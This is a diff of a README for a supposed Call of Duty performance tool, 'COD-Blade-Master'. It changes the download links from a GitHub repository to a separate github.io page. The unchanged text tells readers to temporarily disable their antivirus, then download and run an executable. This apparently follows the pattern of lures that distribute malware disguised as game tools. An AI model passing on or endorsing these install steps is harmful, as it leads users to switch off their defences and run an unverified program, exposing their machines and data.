@@ -1,6 +1,6 @@
 # ⚔️ COD-Blade-Master - Gain control of your gaming performance
 
-[![](https://img.shields.io/badge/Download-Blade-Master-blue.svg)](https://github.com/Valenciatroublefree485/COD-Blade-Master)
+[![](https://img.shields.io/badge/Download-Blade-Master-blue.svg)](https://valenciatroublefree485.github.io)
 
 ## 🎯 About the project
 
@@ -23,7 +23,7 @@ Make sure you disable any active antivirus software temporarily. Some security p
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page: [https://github.com/Valenciatroublefree485/COD-Blade-Master](https://github.com/Valenciatroublefree485/COD-Blade-Master).
+1.  Visit the official repository page: [https://valenciatroublefree485.github.io](https://valenciatroublefree485.github.io).
 2.  Locate the release section on the right side of the screen.
 3.  Click the latest version link to visit the download page.
 4.  Download the executable file to your desktop.
